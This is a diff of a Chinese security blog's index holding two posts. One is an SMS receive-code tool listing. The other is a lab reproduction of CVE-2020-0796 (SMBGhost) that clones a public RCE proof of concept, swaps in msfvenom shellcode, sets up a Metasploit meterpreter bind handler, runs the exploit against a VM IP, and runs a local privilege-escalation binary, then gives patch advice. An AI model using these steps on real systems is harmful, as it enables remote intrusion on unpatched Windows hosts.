@@ -4,7 +4,9 @@
     <title>短信接码工具V1.0</title>
     <url>/2020/06/05/%E7%9F%AD%E4%BF%A1%E6%8E%A5%E7%A0%81%E5%B7%A5%E5%85%B7V1.0/</url>
     <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>因平时需要用到短信接码平台来接收一下短信验证码，每次用的时候都要搜索找然后这点那点的感觉很麻烦，然后最近划水居多就拉着小伙伴（@trepverter）一起捣鼓，所以有了这一款短信接码工具V1.0</p>
-<h5 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h5><p>短信接码工具使用了跨平台兼容能力较好的JAVA语言进行编写，并采用以下接码平台网站做为数据来源，进行提取展示在界面中。</p>
+<a id="more"></a>
+
+<h5 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h5><p>短信接码工具使用了跨平台兼容能力较好的JAVA语言进行编写，并采用以下接码平台网站做为数据来源，进行提取相关数据并展示在界面中。</p>
 <figure class="highlight dts"><table><tr><td class="code"><pre><span class="line">接码平台</span><br><span class="line"><span class="symbol">https:</span><span class="comment">//www.becmd.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//www.z-sms.com/</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//www.shejiinn.com/</span></span><br></pre></td></tr></table></figure>
 
 <h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><p>无</p>
@@ -30,6 +32,8 @@
     <content><![CDATA[<h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>SMB 3.1.1协议中处理压缩消息时，对其中数据没有经过安全检查，直接使用会引发内存破坏漏洞，可能被攻击者利用远程执行任意代码。攻击者利用该漏洞无须权限即可实现远程代码执行，受黑客攻击的目标系统只需开机在线即可能被入侵。</p>
 <h4 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">Windows Server, version <span class="number">1909</span> (Server Core installation)</span><br><span class="line">Windows Server, version <span class="number">1903</span> (Server Core installation)</span><br><span class="line">Windows <span class="number">10</span> Version <span class="number">1903</span> <span class="keyword">for</span> <span class="number">32</span>-bit Systems</span><br><span class="line">Windows <span class="number">10</span> Version <span class="number">1903</span> <span class="keyword">for</span> x64-based Systems</span><br><span class="line">Windows <span class="number">10</span> Version <span class="number">1903</span> <span class="keyword">for</span> ARM64-based Systems</span><br><span class="line">Windows <span class="number">10</span> Version <span class="number">1909</span> <span class="keyword">for</span> <span class="number">32</span>-bit Systems</span><br><span class="line">Windows <span class="number">10</span> Version <span class="number">1909</span> <span class="keyword">for</span> x64-based Systems</span><br><span class="line">Windows <span class="number">10</span> Version <span class="number">1909</span> <span class="keyword">for</span> ARM64-based Systems</span><br></pre></td></tr></table></figure>
 
+<a id="more"></a>
+
 <h4 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">攻击机：</span><br><span class="line">版本：Kali <span class="number">2020.2</span></span><br><span class="line">Python版本：Python <span class="number">3.8</span><span class="number">.2</span></span><br><span class="line">IP地址：<span class="number">192.168</span><span class="number">.174</span><span class="number">.136</span></span><br><span class="line"></span><br><span class="line">目标靶机：</span><br><span class="line">版本：Windows <span class="number">10</span> 专业版</span><br><span class="line">版本号：<span class="number">1903</span></span><br><span class="line">OS版本：<span class="number">10.0</span><span class="number">.18362</span> 暂缺 Build <span class="number">18362</span></span><br><span class="line">RAM：<span class="number">2</span>GB</span><br><span class="line">防火墙状态：关闭</span><br><span class="line">IP地址：<span class="number">192.168</span><span class="number">.174</span><span class="number">.135</span></span><br></pre></td></tr></table></figure>
 
 <h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><h5 id="RCE漏洞复现"><a href="#RCE漏洞复现" class="headerlink" title="RCE漏洞复现"></a>RCE漏洞复现</h5><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># POC下载</span></span><br><span class="line">git <span class="keyword">clone</span> <span class="title">https</span>://github.com/chompie1337/SMBGhost_RCE_PoC</span><br></pre></td></tr></table></figure>
@@ -41,7 +45,7 @@
 <p><img src="/img/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200605105937620.png" alt="image-20200605105937620"></p>
 <p>将生成的py文件中的变量”buf”替换为”USER_PAYLOAD”</p>
 <p><img src="/img/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200605110624030.png" alt="image-20200605110624030"></p>
-<p>并将其所有代码与SMBGhost_RCE_PoC中的exploit.py的中的内容进行覆盖替换</p>
+<p>替换变量名完成后并将其所有代码与SMBGhost_RCE_PoC中的exploit.py的中的部分相似内容（如图）进行覆盖替换</p>
 <p><img src="/img/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200605110911519.png" alt="image-20200605110911519"></p>
 <figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动msf配置</span></span><br><span class="line">kali@kali:~$ msfconsole</span><br><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="keyword">set</span> payload windows/x64/meterpreter/bind_tcp <span class="comment">#设置反弹模式</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="keyword">set</span> rhost <span class="number">192.168</span><span class="number">.174</span><span class="number">.135</span> <span class="comment">#设置目标靶机</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="keyword">set</span> lport <span class="number">6666</span> <span class="comment">#设置监听端口</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">run</span></span><br></pre></td></tr></table></figure>
 
@@ -49,9 +53,7 @@
 <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"># 执行<span class="selector-tag">exploit</span><span class="selector-class">.py</span></span><br><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">exploit</span><span class="selector-class">.py</span> <span class="selector-tag">-ip</span> 192<span class="selector-class">.168</span><span class="selector-class">.174</span><span class="selector-class">.135</span></span><br></pre></td></tr></table></figure>
 
 <p><img src="/img/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200605122324146.png" alt="image-20200605122324146"></p>
-<h5 id="本地提权漏洞复现"><a href="#本地提权漏洞复现" class="headerlink" title="本地提权漏洞复现"></a>本地提权漏洞复现</h5><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/danigargu/</span>CVE-<span class="number">2020</span>-<span class="number">0796</span><span class="regexp">/releases</span></span><br></pre></td></tr></table></figure>
-
-
+<h5 id="本地提权漏洞复现"><a href="#本地提权漏洞复现" class="headerlink" title="本地提权漏洞复现"></a>本地提权漏洞复现</h5><figure class="highlight subunit"><table><tr><td class="code"><pre><span class="line">https://github.com/danigargu/CVE<span class="string">-2020</span><span class="string">-0796</span>/releases</span><br><span class="line">下载后直接命令行运行可执行程序（cve<span class="string">-2020</span><span class="string">-0796</span>-local.exe）</span><br></pre></td></tr></table></figure>
 
 <p><img src="/img/CVE-2020-0796%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20200605124404688.png" alt="image-20200605124404688"></p>
 <h4 id="安全加固"><a href="#安全加固" class="headerlink" title="安全加固"></a>安全加固</h4><p>1、更新官方补丁KB4551762或者KB4556799（累计更新补丁包）。</p>
